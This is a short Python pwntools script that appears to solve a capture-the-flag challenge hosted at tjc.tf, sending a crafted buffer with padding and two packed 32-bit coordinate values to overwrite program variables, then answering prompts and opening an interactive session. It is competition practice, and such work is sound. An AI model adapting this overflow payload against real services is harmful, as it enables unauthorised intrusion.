from pwn import *

#p = process('./chall')
p = remote("tjc.tf",31489)

east_west = 0x01010101  
north_south = 0x02020202  

payload = b'A' * 4
payload += p32(east_west)
payload += p32(north_south)
payload += b'C' * 18

p.sendline(payload)

p.sendlineafter(b"Enter the size of your building (in acres): ", b"5")
p.sendlineafter(b"Enter the east-west coordinate or your building (miles east of the city center): ", b"0")
p.sendlineafter(b"Enter the north-south coordinate or your building (miles north of the city center): ", b"0")

p.sendlineafter(b"Enter the east-west coordinate: ", str(east_west).encode())
p.sendlineafter(b"Enter the north-south coordinate: ", str(north_south).encode())

p.interactive()
